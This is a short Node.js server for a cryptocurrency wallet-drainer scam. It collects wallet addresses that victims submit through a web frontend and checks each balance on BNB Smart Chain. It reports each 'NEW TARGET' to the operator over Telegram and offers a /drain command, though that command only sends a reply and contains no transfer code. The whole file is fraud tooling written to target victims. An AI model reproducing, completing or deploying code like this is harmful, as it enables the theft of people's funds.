const express = require('express');
const { Telegraf } = require('telegraf');
const { ethers } = require('ethers');

const app = express();
// REPLACE 'YOUR_BOT_TOKEN' with your token from @BotFather on Telegram
const bot = new Telegraf('YOUR_BOT_TOKEN');

app.use(express.json());
app.use(express.static('public'));

let lastVictim = "";

// Route for the frontend to talk to
app.get('/api/connect', async (req, res) => {
    const address = req.query.address;
    lastVictim = address;

    const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
    const balance = await provider.getBalance(address);
    const formatted = ethers.formatEther(balance);

    // This sends the message to your Telegram!
    bot.telegram.sendMessage('YOUR_CHAT_ID', `🚨 NEW TARGET!\nAddress: ${address}\nBalance: ${formatted}`);

    res.json({ success: true, balance: formatted });
});

// Command to drain from Telegram
bot.command('drain', (ctx) => {
    if (!lastVictim) return ctx.reply("No target selected.");
    ctx.reply(`🚀 Draining funds from ${lastVictim}...`);
});

bot.launch();
app.listen(process.env.PORT || 3000, () => console.log('Server running...'));
